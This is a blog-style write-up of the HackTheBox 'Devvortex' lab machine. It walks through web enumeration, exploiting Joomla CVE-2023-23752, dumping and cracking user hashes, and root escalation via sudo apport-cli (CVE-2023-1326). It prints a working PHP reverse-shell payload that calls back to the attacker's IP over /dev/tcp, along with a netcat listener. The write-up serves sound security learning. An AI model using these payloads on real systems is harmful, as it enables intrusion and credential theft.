---
title: Devvortex Writeup - HackTheBox
date: 2023-12-29
categories: [Writeups, HTB]
tags: [Linux, HTB, CTF, Easy]
img_path: /assets/img/commons/devvortex/
image: devvortex.png
---

Hello!

In this write-up, we will dive into the **HackTheBox** [**Devvortex**](https://app.hackthebox.com/machines/577) machine.
It is a **Linux** machine on which we will carry out a **Web enumeration** that will lead us to a Joomla application. When we have entered to the admin dashboard, we will be able to get a **reverse shell** and access the system.
Then, we will proceed to do a **privilege escalation** in order to own the system.


Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active.

```bash
> ping -c 1 10.10.11.242
PING 10.10.11.242 (10.10.11.242) 56(84) bytes of data.
64 bytes from 10.10.11.242: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.11.242 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.172/118.172/118.172/0.000 ms
```

## Port scaning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -sT -vvv 10.10.11.242

Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.082s latency)
Not shown: 998 closed tcp ports (conn-refused)
PORT	STATE	SERVICE
22/tcp	open	ssh
80/tcp	open	http
```

## Web Enumeration
---
After the port enumeration, we access to the browser to see what's on the http server.

![home](home.png)

There doesn't seem to be anything interesting, so let's search for hidden directories with `gobuster`.

```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
```

![gobuster1](gobuster_1.png)


There doesn't seem to be anything, let's see what's out there looking for **Virtual Hostings**:

```bash
gobuster vhost -u devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-5000.txt
```


We found the virtual host "`dev.devvortex.htb`", let's access the browser again.


![dev_home](dev_home.png)


After that, we go back to search for hidden directories, and we get:

![gobuster2](gobuster_2.png)

Voilà! We found the directory "`/administrator`".

![admin](admin_page.png)


## Exploitation
---
Inspecting the page we found session cookies but, after trying to use them to access the application using burpsuite, we realize that it is a **rabbit hole**.


Searching for information, we found the tool `joomscan`, we installed it and ran it against the machine.
We found that the server is using Joomla version 4.2.6, which is vulnerable to the [**CVE-2023-23752**](https://www.cvedetails.com/cve/CVE-2023-23752/)

On the **exploit-db** website we found a PoC, so we download it and test it against the server.

![exploit](exploit.png)


## Information gathering
---


### Credentials
As we can see, when executing the exploit we get some access credentials. We tried to use them through the SSH server but without success;
however, we were able to access the Joomla admin panel.

![dashboard](dashboard_admin.png)


### Obtaining a Reverse Shell
Investigating a little bit through the dashboard interface, we found (inside the System section) a subsection called Administrator Templates.
Inside, we found a pre-installed template, we access and found this:

![templates](templates_dash.png)

To get a reverse shell, all we have to do is to inject a payload in any .php file and then open its path from the browser.

We open the **login.php** file and write the following payload:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.14.120/443 0>&1"');
```

> NOTE: If you are going to use the payload, be sure to set your ip and port.


We save the modified file, open a new tab and access the file path while we set `netcat` to listen using the command:

```bash
nc -lnvp 443
```

And we are in!

### Obtaining the user flag
In order to get the user flag we have to access the system with the user *logan*. As we saw when we ran the exploit, *logan* was also registered in Joomla, therefore, it must alse be registered in the database.

We open `mysql`, but before, we create an interactive pseudo-terminal using:

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

Now, we access `mysql`:

```bash
mysql -u lewis -p joomla --password=+++++++++
```

Once we are inside mysql, we can see what's inside using the instruction:

```sql
SHOW TABLES;
```

We found 71 tables, but we are only interested in one: **sd4fg_users**. Let's see what contains:

```sql
SELECT * FROM sd4fg_users;
```

![data](data_leak.png)

We can see the encrypted password. Using tools like Hashcat or JohnTheRipper we should be able to get the plaintext password easily.

```bash
john hash-file.txt --wordlists=/usr/share/wordlists/rockyou.txt
```

We get the following:

![passwd](logan_passwd.png)

We can now access via SSH as the user logan and, after that, we should be able to get the **user.txt** flag.

![user_flag](logan_flag.png)


## Privilege escalation
---
Now that we have user access to the system, let's look at how we can escalate privileges.

We start by looking for which processes are running with sudo permissions and, in addition, are visible to the user logan. We execute the command:

```bash
sudo -l
```

After running it, we can see that the user logan has sudo access to the **apport-cli** tool. We run `apport-cli -v` and get that the version running is 2.20.11

Searching in google we find [this commit](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)
that warns us of the [**CVE-2023-1326**](https://www.cvedetails.com/cve/CVE-2023-1326/) in this `apport-cli` version and gives us a PoC to exploit it.

All we need to do is execute the following:

```bash
sudo /usr/bin/apport-cli -c /var/crash/test.crash
```

After executing this, we can see that we are asked to select a letter, we press 'v', wait for a few seconds and as if it were magic, we get the pager.
Now, all we need to do is run `!/bin/bash` and we spawn a root terminal.

Finally, we have the whole system committed and, of course, we can now obtain the root flag of the machine.



> H4Ppy H4ck1ng!
